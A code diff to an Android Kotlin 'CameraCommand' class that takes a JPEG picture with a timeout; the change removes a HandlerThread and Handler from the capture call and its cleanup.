@@ -4,8 +4,6 @@ import android.content.Context
 import android.content.pm.PackageManager
 import android.graphics.ImageFormat
 import android.hardware.Camera
-import android.os.Handler
-import android.os.HandlerThread
 import androidx.core.content.ContextCompat
 import java.io.File
 import java.util.concurrent.CountDownLatch
@@ -39,7 +37,6 @@ class CameraCommand : Command {
         val latch = CountDownLatch(1)
         var result: CommandResult = CommandResult.Text("Camera error: unknown")
         var camera: Camera? = null
-        var handlerThread: HandlerThread? = null
 
         try {
             camera = Camera.open(cameraId)
@@ -52,9 +49,6 @@ class CameraCommand : Command {
             }
             params.pictureFormat = ImageFormat.JPEG
             camera.parameters = params
-
-            handlerThread = HandlerThread("CameraCapture").apply { start() }
-            val handler = Handler(handlerThread.looper)
 
             camera.takePicture(null, null, object : Camera.PictureCallback {
                 override fun onPictureTaken(data: ByteArray?, cam: Camera) {
@@ -72,7 +66,7 @@ class CameraCommand : Command {
                         latch.countDown()
                     }
                 }
-            }, handler)
+            })
 
             if (!latch.await(10, TimeUnit.SECONDS)) {
                 result = CommandResult.Text("Camera capture timed out after 10 seconds.")
@@ -80,7 +74,6 @@ class CameraCommand : Command {
         } catch (e: Exception) {
             result = CommandResult.Text("Camera error: ${e.message}")
         } finally {
-            handlerThread?.quitSafely()
             camera?.release()
         }
 
